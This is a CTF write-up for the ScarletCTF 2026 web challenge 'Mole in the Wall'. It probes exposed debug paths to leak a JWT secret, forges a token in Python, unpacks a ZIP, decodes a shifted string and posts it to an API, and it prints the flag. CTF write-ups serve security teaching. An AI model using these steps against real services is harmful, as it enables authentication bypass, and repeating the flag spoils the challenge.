---
ctf: ScarletCTF 2026
category: web
difficulty: hard
points: 400
flag: RUSEC{m1cro$oft_n3ver_mad3_g00d_aut0m4t1on}
techniques:
  - jwt-forgery
  - zip-extraction
  - api-flow-exploitation
tools:
  - python
  - jwt-tool
---

# Mole in the Wall

## Description

We just launched our new parent development company, Girlie Pop's Pizza Place! Packed with your favorite animatronics, we hold pizza parties and games galore! Sometimes Bonita the Yellow Rabbit has been acting a bit out of line recently however...

**Hint:** The animatronics get a bit quirky at night. They tend to get their security from a JSON in debug/config...

**URL:** `https://girlypies.ctf.rusec.club`

## Solution

### 1. Find the exposed debug config JSON

```bash
GET /debug/config/security.json
```

This shows HS256 and required claims: `department=security`, `role=nightguard`, `shift=night`.

### 2. Locate the JWT secret

```bash
GET /debug/config/.env
```

This returns JSON with `JWT_SECRET`.

### 3. Forge a JWT

```python
import jwt

payload = {
    "department": "security",
    "role": "nightguard",
    "shift": "night"
}

secret = "leaked_secret_here"
token = jwt.encode(payload, secret, algorithm="HS256")
```

Submit it to `/login` - the response is a ZIP file.

### 4. Extract the ZIP

Contains:
- `logs/session.log` (an obfuscated token)
- `config/settings.xml` (API path `/api/run-flow`)
- A flow definition that decodes the session log by subtracting 1 from each ASCII code

### 5. Decode and execute

```python
# Decode session.log
with open('logs/session.log', 'r') as f:
    encoded = f.read()

decoded = ''.join(chr(ord(c) - 1) for c in encoded)
# decoded = "t#at_purpl3_guy"

# Submit to API
response = requests.post('https://girlypies.ctf.rusec.club/api/run-flow',
                        json={"input": decoded},
                        headers={"Authorization": f"Bearer {token}"})
print(response.json()['flag'])
```

